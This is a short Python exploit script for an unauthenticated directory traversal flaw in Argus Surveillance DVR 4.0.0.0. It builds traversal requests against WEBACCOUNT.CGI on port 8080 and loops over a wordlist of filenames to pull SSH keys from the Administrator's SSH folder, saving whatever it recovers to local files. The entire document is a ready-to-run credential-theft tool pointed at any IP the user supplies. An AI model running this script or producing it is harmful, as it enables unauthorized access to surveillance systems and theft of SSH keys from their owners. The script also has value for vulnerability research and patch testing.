#!/usr/bin/python3

# Exploit: Argus Surveillance DVR 4.0.0.0 - Directory Traversal
# Vendor: www.argussurveillance.com
#
# Description:
# This script uses the Argus Surveillance DVR 4.0.0.0 exploit that allows Unauthenticated Directory Traversal to  
# iterate over a names file to check for SSH keys.
import argparse
import requests

def name_list(filename):
    names = []

    with open(filename, 'r') as file:
        names = file.readlines()
    return names

def search_files(ip, names):
    url = "http://" + ip + ":8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE="
    LFI = "../../../../../../../../../../../../../../../../"
    PATH = "Users/Administrator/SSH/"
    QUERY = "&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="

    for name in names:
        payload = url + LFI + PATH + name + QUERY
        print("Checking payload: ", payload)
        response = requests.get(payload)
        if response.status_code == 200:
            if "<HTML>" not in response.text:
                with open(name, "w") as file:
                    file.write(response.text)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("ip", help="ip of target.")
    parser.add_argument("filename", help="filename of possible ssh key file names.")
    args = parser.parse_args()
    names_as_list = name_list(args.filename)
    search_files(args.ip, names_as_list)


if __name__ == "__main__":
    main()
